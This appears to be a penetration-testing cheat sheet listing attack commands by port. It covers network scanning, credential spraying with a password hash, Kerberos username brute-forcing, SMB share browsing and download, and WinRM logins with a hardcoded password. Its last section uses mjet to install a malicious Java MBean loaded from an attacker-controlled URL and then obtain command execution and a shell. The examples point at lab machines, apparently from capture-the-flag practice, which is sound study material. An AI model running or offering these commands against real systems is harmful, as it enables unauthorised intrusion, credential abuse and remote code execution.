## Initial scan  
Discover the hosts on the network (Linux) :   
`for i in {1..255};do ping -c 1 192.168.110.$i > /dev/null;if [ $? -eq 0];then echo 192.168.110.$i;fi;done`   
`nmap -Pn -p- -v 192.168.110.1-255` 

Scan all ports on a host and execute nmap scripts (Linux & Windows):   
`nmap -A -p- -v 192.168.110.55`  

Spray creds on several hosts (Linux & Windows):   
`crackmapexec smb <host> -d <domain> -u <username> -p <password> -H <hash> --shares`
`crackmapexec winrm 192.168.110.0/24 -u Tom -H '8af1903d3c80c3552a84b6ba299db2ea' --local-auth`


## Port 88 - Kerberos  
Valid usernames can be discovered by brute force against a Kerberos service. When an invalid username is requested the server will respond using the Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, allowing us to determine that the user name was invalid. Valid user names will illicit either the TGT in a AS-REP response or the error KRB5KDC_ERR_PREAUTH_REQUIRED, signaling that the user is required to perform pre authentication.   
<br/>
**Windows - User enumeration:**  
`Rubeus.exe brute /users:<userlist.txt> /domain:spookysec.local /password:yolo /dc:<dc_ip>`  
(One fake password is provided so the accounts are not bruteforced)  
  
**Linux - User enumeration:**  
`./kerbrute_linux_amd64 userenum --domain timelapse.htb --dc 10.10.11.152 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt`     
<br/>
## Port 135 - MSRPC  
TODO  
<br/>
## Port 445 - SMB
**List SMB shares (python, Linux & Windows):**  
`smbmap -u "Guest" -H "10.10.11.152"`  
    
**Browse SMB shares (python, Linux & Windows):**  
`smbmap -u "Guest" -H "10.10.11.152" -r "IPC$"`    
    
**Download SMB files (python, Linux & Windows):**     
`smbmap -u "guest" -H 10.10.11.152 --download "Shares\Dev\winrm_backup.zip"`    
<br/> 
## Ports 389,636,3268,3269 - LDAP  
`nmap -n -sV -Pn --script "ldap* and not brute" 10.10.11.174`    
<br/>    
## Ports 5985,5986 - WinRM  
Using Evil-WinRM (Linux & Windows) :    
`gem install evil-winrm`  
`evil-winrm –i <host> –u <username> [-p <password>] [-H <hash>]`  
   
Using WinRS.exe (native PowerShell client):  
`$ winrs /r:<host> /u:<domain\username> /p:<password> <command>`  
  
Using native PowerShell :    
`PS> $creds = (New-Object System.Management.Automation.PSCredential('admin',(ConvertTo-SecureString 's3cure_PaSsw0rd!' -AsPlainText -Force)))`   
`PS> Enter-PsSession -ComputerName 10.10.11.174 -Credential $creds`   
`PS> Invoke-Command -computername support.htb -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]`  
  
## Port XXXX - Java RMI - JMX
**Command execution:**  
Use mjet.py : https://github.com/mogwailabs/mjet   
JMX is used to manage remote Java resources such as MBeans. If no authentication is configured, it is possible to list the differents MBeans:  
Install jdk and use the `jconsole` binary in `\Java\jdk-18.0.2\bin\jconsole.exe` to access the service.  
it is thus possible to install a malicious MBean and execute commands:  
  
Example commands : `jython mjet.py target.test.com 18051 install tonkabean http://<attacker_IP>:6666 6666`  
`jython mjet.py target.test.com 18051 command tonkabean "id"`  
`jython mjet.py target.test.com 18051 shell tonkabean`  
Uninstall the malicious MBean at the end : `jython mjet.py target.test.com 18051 uninstall`  
